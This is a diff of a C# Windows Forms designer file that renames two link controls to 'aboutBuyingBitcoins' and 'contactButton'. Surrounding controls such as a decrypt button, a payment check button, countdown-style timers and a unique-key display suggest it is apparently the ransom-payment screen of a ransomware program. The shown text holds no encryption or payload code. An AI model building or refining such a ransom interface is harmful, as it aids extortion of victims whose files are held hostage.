@@ -46,8 +46,8 @@
             this.decryptBtn = new System.Windows.Forms.Button();
             this.riseTimer = new System.Windows.Forms.Timer(this.components);
             this.aboutBitcoin = new System.Windows.Forms.LinkLabel();
-            this.aboutLitecoin = new System.Windows.Forms.LinkLabel();
-            this.aboutZcash = new System.Windows.Forms.LinkLabel();
+            this.aboutBuyingBitcoins = new System.Windows.Forms.LinkLabel();
+            this.contactButton = new System.Windows.Forms.LinkLabel();
             this.lostTimer = new System.Windows.Forms.Timer(this.components);
             this.uniqueKeyDisplay = new System.Windows.Forms.TextBox();
             this.label4 = new System.Windows.Forms.Label();
@@ -266,33 +266,33 @@
             this.aboutBitcoin.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
             this.aboutBitcoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutBitcoin_LinkClicked);
             // 
-            // aboutLitecoin
+            // aboutBuyingBitcoins
             // 
-            this.aboutLitecoin.AutoSize = true;
-            this.aboutLitecoin.LinkColor = System.Drawing.Color.White;
-            this.aboutLitecoin.Location = new System.Drawing.Point(98, 673);
-            this.aboutLitecoin.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
-            this.aboutLitecoin.Name = "aboutLitecoin";
-            this.aboutLitecoin.Size = new System.Drawing.Size(155, 20);
-            this.aboutLitecoin.TabIndex = 12;
-            this.aboutLitecoin.TabStop = true;
-            this.aboutLitecoin.Text = "How to buy bitcoins?";
-            this.aboutLitecoin.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
-            this.aboutLitecoin.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutLitecoin_LinkClicked);
+            this.aboutBuyingBitcoins.AutoSize = true;
+            this.aboutBuyingBitcoins.LinkColor = System.Drawing.Color.White;
+            this.aboutBuyingBitcoins.Location = new System.Drawing.Point(98, 673);
+            this.aboutBuyingBitcoins.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
+            this.aboutBuyingBitcoins.Name = "aboutBuyingBitcoins";
+            this.aboutBuyingBitcoins.Size = new System.Drawing.Size(155, 20);
+            this.aboutBuyingBitcoins.TabIndex = 12;
+            this.aboutBuyingBitcoins.TabStop = true;
+            this.aboutBuyingBitcoins.Text = "How to buy bitcoins?";
+            this.aboutBuyingBitcoins.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.aboutBuyingBitcoins.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutBuyingBitcoin_LinkClicked);
             // 
-            // aboutZcash
+            // contactButton
             // 
-            this.aboutZcash.AutoSize = true;
-            this.aboutZcash.LinkColor = System.Drawing.Color.White;
-            this.aboutZcash.Location = new System.Drawing.Point(98, 730);
-            this.aboutZcash.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
-            this.aboutZcash.Name = "aboutZcash";
-            this.aboutZcash.Size = new System.Drawing.Size(65, 20);
-            this.aboutZcash.TabIndex = 13;
-            this.aboutZcash.TabStop = true;
-            this.aboutZcash.Text = "Contact";
-            this.aboutZcash.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
-            this.aboutZcash.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.aboutZcash_LinkClicked);
+            this.contactButton.AutoSize = true;
+            this.contactButton.LinkColor = System.Drawing.Color.White;
+            this.contactButton.Location = new System.Drawing.Point(98, 730);
+            this.contactButton.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
+            this.contactButton.Name = "contactButton";
+            this.contactButton.Size = new System.Drawing.Size(65, 20);
+            this.contactButton.TabIndex = 13;
+            this.contactButton.TabStop = true;
+            this.contactButton.Text = "Contact";
+            this.contactButton.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.contactButton.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.contactButton_LinkClicked);
             // 
             // lostTimer
             // 
@@ -343,8 +343,8 @@
             this.Controls.Add(this.textBox1);
             this.Controls.Add(this.label4);
             this.Controls.Add(this.uniqueKeyDisplay);
-            this.Controls.Add(this.aboutZcash);
-            this.Controls.Add(this.aboutLitecoin);
+            this.Controls.Add(this.contactButton);
+            this.Controls.Add(this.aboutBuyingBitcoins);
             this.Controls.Add(this.aboutBitcoin);
             this.Controls.Add(this.decryptBtn);
             this.Controls.Add(this.checkpaymentBtn);
@@ -395,8 +395,8 @@
         private System.Windows.Forms.Button decryptBtn;
         private System.Windows.Forms.Timer riseTimer;
         private System.Windows.Forms.LinkLabel aboutBitcoin;
-        private System.Windows.Forms.LinkLabel aboutLitecoin;
-        private System.Windows.Forms.LinkLabel aboutZcash;
+        private System.Windows.Forms.LinkLabel aboutBuyingBitcoins;
+        private System.Windows.Forms.LinkLabel contactButton;
         private System.Windows.Forms.Timer lostTimer;
         public System.Windows.Forms.TextBox displayMessage;
         public System.Windows.Forms.TextBox uniqueKeyDisplay;
